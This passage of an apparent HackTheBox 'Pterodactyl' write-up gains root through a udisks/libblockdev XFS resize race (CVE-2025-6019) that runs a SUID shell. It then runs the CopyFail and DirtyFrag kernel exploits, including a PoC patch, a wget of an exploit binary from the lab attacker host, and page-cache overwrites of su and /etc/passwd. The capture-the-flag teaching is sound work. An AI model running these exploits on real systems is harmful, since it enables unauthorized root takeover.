/dev/loop0 on /run/media/phileasfogg3/d5a0c55e-7f38-471b-ba4b-ebe8d1851a66 type xfs (rw,nosuid,nodev,relatime,attr2,inode64,logbufs=8,logbsize=32k,noquota,uhelper=udisks2)
```

I’ll unmount it:

```console
phileasfogg3@pterodactyl:~> udisksctl unmount -b /dev/loop0
Unmounted /dev/loop0.
```

The user-visible mount goes through udisks’s mount handler, which adds `nosuid,nodev` to stop tricks like this. CVE-2025-6019 is in the resize path. When udisks asks libblockdev to resize an XFS volume, libblockdev mounts the filesystem internally at `/tmp/blockdev.XXXXXX` to run the resize tooling, and that internal mount doesn’t carry udisks’s security flags. For the duration of the resize, the filesystem is live with full SUID semantics. The plan is to win that window. I’ll drop a SUID-root shell into the image, fire the resize, and execute it from the temp directory before the resize unwinds.

First I’ll check the format of the temp directory by starting a watcher in one SSH session and triggering a resize from another:

```console
phileasfogg3@pterodactyl:~> gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
```

The watcher catches the format:

```console
phileasfogg3@pterodactyl:~> while true; do find /tmp /run /var/tmp -maxdepth 3 -type d \( -name '*resize*' -o -name '*blockdev*' -o -name 'temp-*' -o -name '.*-XXX*' \) 2>/dev/null; done | awk '!seen[$0]++'
/tmp/blockdev.VY5KP
```

That resize and watcher loop leaked the format and location of the temporary mount. Now I can create a new watcher that will attempt to abuse this the next time I resize:

```bash
  while true; do
    for d in /tmp/blockdev.*; do
      if [ -x "$d/rootbash" ] && "$d/rootbash" -p -c \
        'cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 4755 /tmp/0xdf; echo PWNED' 2>/dev/null
      then
        break 2
      fi
    done
  done
```

The next resize gives the loop its window. `rootbash` becomes briefly executable as root inside `/tmp/blockdev.XXXXXX`, and the loop uses it to copy `bash` to `/tmp/0xdf` and make that copy SUID-root too. From the other session I fire the same gdbus resize as before, and the watcher prints PWNED:

```console
phileasfogg3@pterodactyl:~> while true; do
>   for d in /tmp/blockdev.*; do
>     if [ -x "$d/rootbash" ] && "$d/rootbash" -p -c \
>       'cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 4755 /tmp/0xdf; echo PWNED' 2>/dev/null
>     then
>       break 2
>     fi
>   done
> done
PWNED
```

`/tmp/0xdf` gives a root shell (with `-p` to not drop privs):

```console
phileasfogg3@pterodactyl:~> /tmp/0xdf -p
0xdf-4.4#
```

And the root flag:

```console
0xdf-4.4# cat root.txt
665fe940************************
```

## Beyond Root

### Background

There have been two big Linux privesc vulns released over the last few weeks, [CopyFail](https://copy.fail/) and [DirtyFrag](https://github.com/V4bel/dirtyfrag). Both are exploits that get a write primitive into cached memory and overwrite a sensitive file to get execution as root. Both of them provide POC exploits that don’t quite work out of the box on Pterodactyl. I’ll use Beyond Root today to get both working here and explore a bit.

### Copy Fail

#### Background

The [CopyFail](https://copy.fail/) website describes it as:

> One logic bug in `authencesn`, chained through `AF_ALG` and `splice()` into a 4-byte page-cache write — silently exploitable for nearly a decade.

I made a [video](https://www.youtube.com/watch?v=wQ914geKOcw) diving into this and showing it run on [HTB Snapped](https://0xdf.gitlab.io/2026/04/01/htb-snapped.html):

The POC for this one was very much code-golfed down to 732 bytes, which makes it unreadable. I’ll use the [deobfuscated copy](https://github.com/0xdf223/copy-fail-CVE-2026-31431) I made.

#### On Pterodactyl

I’ll copy the exploit and from an SSH session as phileasfogg3, use `vim` to save a copy. When I run it, it fails:

```console
phileasfogg3@pterodactyl:~> python3 copyfail.py
Traceback (most recent call last):
  File "copyfail.py", line 110, in <module>
    main()
  File "copyfail.py", line 100, in main
    overwrite_chunk(fd, i, PATCH_ELF[i:i + AUTH_SIZE])
  File "copyfail.py", line 82, in overwrite_chunk
    os.splice(file_fd, pipe_w, splice_len, offset_src=0)
AttributeError: module 'os' has no attribute 'splice'
```

Interestingly, searching for this error, the top results are all about Copy Fail:

![image-20260512071918564](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260512071918564.png)

The Python [documentation](https://docs.python.org/3/library/os.html#os.splice) on the `os` module shows that `splice` was added in Python 3.10:

![image-20260512071316776](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260512071316776.png)

Pterodactyl is running Python 3.6:

```console
phileasfogg3@pterodactyl:~> python3 -V
Python 3.6.15
```

Luckily, this is a quick fix. There’s a C version of the exploit that has direct access to the `splice` system call through GLIBC, or there are many Python versions out there that are updated to work around this. I like [this one](https://github.com/theori-io/copy-fail-CVE-2026-31431/pull/117) from mohammadali-davarzani, which simply changes the `splice` call into the pipe to a `os.sendfile`:

![image-20260512072530500](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260512072530500.png)

This works because under the hood, `sendfile()` is implemented in modern Linux kernels using the exact same `splice()` machinery, setting up an internal kernel-managed pipe and copying page-cache references (not byte copies) from the file into the destination socket.

In my code, the change looks like:

```python
    #pipe_r, pipe_w = os.pipe()
    #os.splice(file_fd, pipe_w, splice_len, offset_src=0)
    #os.splice(pipe_r, op_sock.fileno(), splice_len)
    os.sendfile(op_sock.fileno(), file_fd, 0, splice_len)

    try:
        op_sock.recv(8 + offset)
    except OSError:
        pass

    #os.close(pipe_r)
    #os.close(pipe_w)
    op_sock.close()
    sock.close()
```

I’m able to remove the pipes entirely, and replace it with a single `os.sendfile` call. It works:

```console
phileasfogg3@pterodactyl:~> python3 copyfail.py
pterodactyl:/home/phileasfogg3 #
```

CopyFail works by overwriting a sensitive file’s page cache (the in-memory copy the kernel hands out) without ever touching disk. The file looks modified to every reader on the system until the cache is dropped. `echo 3 > /proc/sys/vm/drop_caches` flushes the page cache so the file goes back to its on-disk contents, which avoids leaving the machine in an insecure state.

### DirtyFrag

#### Background

[DirtyFrag](https://github.com/V4bel/dirtyfrag) describes itself as:

> This document describes the Dirty Frag vulnerability class, first discovered and reported by [Hyunwoo Kim (@v4bel)](https://x.com/v4bel), which can obtain root privileges on major Linux distributions by chaining the `xfrm-ESP Page-Cache Write (CVE-2026-43284)` vulnerability and the `RxRPC Page-Cache Write (CVE-2026-43500)` vulnerability.

I made a [video](https://www.youtube.com/watch?v=B5eUI_e7iwE) diving into this vulnerability, the exploit, the drama around its disclosure, and demo it on [HTB Snapped](https://0xdf.gitlab.io/2026/04/01/htb-snapped.html):

#### On Pterodactyl

DirtyFrag just works on Pterodactyl. I had some uncertainly that a binary compiled on my Ubuntu system would run on this openSUSE system, but it did:

```console
phileasfogg3@pterodactyl:~> wget 10.10.14.61/exp
Prepended http:// to '10.10.14.61/exp'
--2026-05-12 14:43:05--  http://10.10.14.61/exp
Connecting to 10.10.14.61:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 62320 (61K) [application/octet-stream]
Saving to: ‘exp’

exp                           100%[===============================================>]  60.86K  --.-KB/s    in 0.04s

2026-05-12 14:43:05 (1.50 MB/s) - ‘exp’ saved [62320/62320]

phileasfogg3@pterodactyl:~> chmod +x exp
phileasfogg3@pterodactyl:~> ./exp -v
[su] installed 48 xfrm SAs
[su] wrote 192 bytes to /usr/bin/su starting at 0x0
[su] /usr/bin/su page-cache patched (entry 0x78 = shellcode)
pterodactyl:/home/phileasfogg3 #
```

The exploit worked and returned a root shell.

The binary has two exploit paths. It tries ESP first and only falls through to RxRPC if ESP fails. ESP needs an unprivileged user namespace, which openSUSE Leap 15.6 ships enabled by default (unlike Ubuntu 23.10+, which restricts unprivileged userns via AppArmor). So as expected, the ESP path works.

I can force it down the RxRPC route, either by running with `--force-rxrpc`, or by removing the ability for users to create namespaces as root (and resetting the cache):

```console
pterodactyl:/home/phileasfogg3 # echo 0 > /proc/sys/user/max_user_namespaces
pterodactyl:/home/phileasfogg3 # echo 3 > /proc/sys/vm/drop_caches
```

Running now shows that the ESP path fails, but then it crashes in the RxRPC path:

```console
phileasfogg3@pterodactyl:~> ./exp -v
[su] unshare: No space left on device
[su] corruption stage failed (status=0x100)

=== rxrpc/rxkad LPE EXPLOIT (uid=1000 → root) ===
[*] uid=1002 euid=1002 gid=100
[+] rxrpc module autoloaded via dummy socket(AF_RXRPC)
[+] target /etc/passwd opened RO, size=1505, uid=0 gid=0 mode=0644
[+] mmap'd /etc/passwd page-cache at 0x7f0737840000 (PROT_READ|MAP_SHARED)
[+] /etc/passwd line 1 first 16 bytes:
72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a
[*] /etc/passwd line 1 (root entry) BEFORE: 'root:x:0:0:root:/root:/bin/bash$'
[+] Ca @ 4: 3a783a303a303a72 ":x:0:0:r"
[+] Cb @ 6: 3a303a303a726f6f ":0:0:roo"
[+] Cc @ 8: 3a303a726f6f743a ":0:root:"
[+] fcrypt selftest OK

=== STAGE 1a: search K_A (chars 4-5 := "::")  prob ~1.5e-5 ===
[+] K_A found after 110762 iters in 0.03s (3.49M/s) K=3fa4431c479c0ee3  P=3a3ae9c579282a20 "::..y(* "
[+] Cb_actual (after splice A) = e9c579282a206f6f

=== STAGE 1b: search K_B (chars 6-7 := "0:")  prob ~1.5e-5 ===
[+] K_B found after 6287 iters in 0.00s (4.04M/s) K=f3f1fa5e36f497b1  P=303a6c9c4137a9d2 "0:l.A7.."
[+] Cc_actual (after splice B) = 6c9c4137a9d2743a

=== STAGE 1c: search K_C (chars 8-15 := "0:GGGGGG:")  prob ~5.4e-8 ===
[+] K_C found after 28567170 iters in 6.49s (4.40M/s) K=6f316bada7ef8d8b  P=303a1c7d536d403a "0:.}Sm@:"

[+] Predicted post-corruption /etc/passwd line 1:
    "root::0:0:.}Sm@:/root:/bin/bash"

=== STAGE 2a: kernel trigger A @ off 4 (set chars 4-5 "::") ===
[+] plain UDP fake-server bound :7779
[+] AF_RXRPC client bound :7780
Segmentation fault
```

I believe this is because the exploit isn’t written to work on this kernel. The RxRPC variant of the exploit hardcodes internal kernel struct offsets that were derived from upstream-ish kernels. I suspect that the author didn’t tune for this kernel since the vast majority of openSUSE targets will be vulnerable to the ESP path.
